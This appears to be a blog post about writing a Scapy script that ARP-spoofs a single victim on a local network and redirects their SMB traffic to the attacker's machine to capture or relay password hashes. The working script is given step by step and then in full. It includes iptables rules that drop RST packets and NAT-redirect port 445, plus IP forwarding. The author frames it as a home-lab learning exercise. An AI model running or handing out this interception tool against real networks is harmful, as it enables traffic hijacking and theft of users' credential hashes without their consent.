---
published: true
---
Sure there are already some pretty good security tools that can pull off ARP spoofing: Ettercap, Bettercap, etc. This post details what I learned when I wanted to do it myself using Scapy, in the hopes that I can help someone else who's also trying to learn how to use Scapy. After a while you get tired of using other people's tools and want to learn how to do it yourself, even if you're just creating yet another tool to do 'X', at least you're learning something new.

Man In The Middle (MITM) attacks against a whole subnet frequently cause a Denial of Service (DoS) condition. In this case, I want to ARP spoof a single victim and redirect any SMB traffic to my attacker system so that I can capture or relay hashes. 

In my lab, my victim was running a fully patched Windows 10 OS. I monitored my arp table using 'arp -a'. In the interest of saving some time and not having to run an extended ARP spoof attack, I cleared my victim's ARP cache using 'arp -d *' before starting the attack.

First, our imports and argument parser. Using sys.argv[] for command line arguments is just clunky. I like to use argparser even in really short scripts that accept cli arguments.

```python
from scapy.all import *
import os
import sys
import argparse

# Add arguments
parser = argparse.ArgumentParser(description='ScapyArpSpoof.py - ARP spoof a victim and redirect their SMB traffic to a local SMB listener to capture or relay hashes.')
parser.add_argument("victim_IP", help="Victim IP address.")
parser.add_argument("interface", help="Network interface name")
parser.add_argument("target_IP", help="Gateway or target IP address. Must be on the same broadcast domain as the attacker and victim.")
args = parser.parse_args()
```

Now we need to set some iptables rules and also enable IP forwarding. The first iptables rule prevents the kernel from seeing traffic that didn't originate from the kernel and sending a RST, which would kill our connection. The ip_forward is necessary, otherwise you'll DoS the victim that you're attacking because your system will intercept their comms but won't forward traffic on to the destination. The final iptables argument is required to forward any SMB traffic on to our attacker's IP address on port 445 so that we can either capture the hash and crack it, or relay it on using tools such as Metasploit, Responder, or other SMB relay tools.

```python
# Prevent kernel from interfering and sending RST's.
os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
# Enable forwarding so that we don't cause a DoS.
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
# Redirect SMB traffic between victim and target to our IP address.
os.system("iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination {}:445".format(get_if_addr(args.interface)))
```

This section creates the variables required for ARP. Hopefully I've commented the code well enough as-is to make it self-explanatory. The reason why you need a victim IP and a target IP is that in this case we're targetting a single victim and don't want to risk making ourselves known and risk DoS'ing a whole subnet. Very frequently a MiTM attack causes service disruptions, so I don't want to target a whole subnet. The target IP is either going to be the system that the victim is communicating with on the same subnet, or the default gateway (router) if on a different network subnet. Adjust the send arguments 'inter' and 'count' if you want to spoof more or less than a count of 60 here, which works out to one request per second for 60 seconds.

```python
# Create Arp args.
a = ARP()
a.pdst = args.victim_IP
a.hwsrc = get_if_hwaddr(args.interface) #attacker MAC address
a.psrc = args.target_IP
a.hwdst = "ff:ff:ff:ff:ff:ff"
send(a, inter=1, count=60)
```

Finally, we're going to clean up those iptables rules and reset IP forwarding to the default.

```python
# Restore iptables and /proc/sys/net/ipv4/ip_forward.
os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -D PREROUTING -p tcp --dport 445 -j DNAT --to-destination {}:445".format(get_if_addr(args.interface)))
```

Complete code:

```python
from scapy.all import *
import os
import sys
import argparse

# Add arguments
parser = argparse.ArgumentParser(description='ScapyArpSpoof.py - ARP spoof a victim and redirect their SMB traffic to a local SMB listener to capture or relay hashes.')
parser.add_argument("victim_IP", help="Victim IP address.")
parser.add_argument("interface", help="Network interface name")
parser.add_argument("target_IP", help="Gateway or target IP address. Must be on the same broadcast domain as the attacker and victim.")
args = parser.parse_args()

# Prevent kernel from interfering and sending RST's.
os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
# Enable forwarding so that we don't cause a DoS.
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
# Redirect SMB traffic between victim and target to our IP address.
os.system("iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination {}:445".format(get_if_addr(args.interface)))

# Create Arp args.
a = ARP()
a.pdst = args.victim_IP
a.hwsrc = get_if_hwaddr(args.interface) #attacker MAC address
a.psrc = args.target_IP
a.hwdst = "ff:ff:ff:ff:ff:ff"
send(a, inter=1, count=60)

# Restore iptables and /proc/sys/net/ipv4/ip_forward.
os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -D PREROUTING -p tcp --dport 445 -j DNAT --to-destination {}:445".format(get_if_addr(args.interface)))
```
